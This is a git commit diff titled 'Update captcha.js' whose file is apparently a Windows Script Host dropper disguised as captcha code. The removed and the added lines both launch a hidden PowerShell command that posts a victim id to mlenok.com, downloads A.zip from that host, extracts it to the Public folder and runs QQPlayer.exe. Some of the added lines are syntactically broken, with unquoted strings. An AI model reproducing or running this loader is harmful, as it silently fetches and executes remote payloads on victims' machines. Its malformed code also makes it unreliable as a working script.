8d56cc5db2bf36c69d241a3b75d37886c7f17094
captcha-v2 <zaafog@gmail.com>
2025-03-17 23:14:22 +0300

    Update captcha.js

--- captcha.js
+++ captcha.js
@@ -1,4 +1,8 @@
 // captcha.js update test
+var args = WScript.Arguments;
+var id = args.Item(0);
+var body = id= + id
+
 var shell = WScript.CreateObject("WScript.Shell");
-var cmd = 'powershell -nop -w hidden -c "$p=$env:PUBLIC+\'\\QQPlayer.exe\';$z=$p+\'.zip\';iwr https://mlenok.com/check.php -Method Post -Body \'id=fqn1\';irm https://mlenok.com/A.zip -o $z;Expand-Archive $z $env:PUBLIC -Force;start $p"';
-shell.Run("cmd /c start /min " + cmd, 0, false); 
+var cmd = powershell -nop -w hidden -c "$p=$env:PUBLIC+\'\\QQPlayer.exe\';$z=$p+\'.zip\';iwr https://mlenok.com/check.php -Method Post -Body body;irm https://mlenok.com/A.zip -o $z;Expand-Archive $z $env:PUBLIC -Force;start $p";
+shell.Run("cmd /c start /min " + cmd, 0, false);
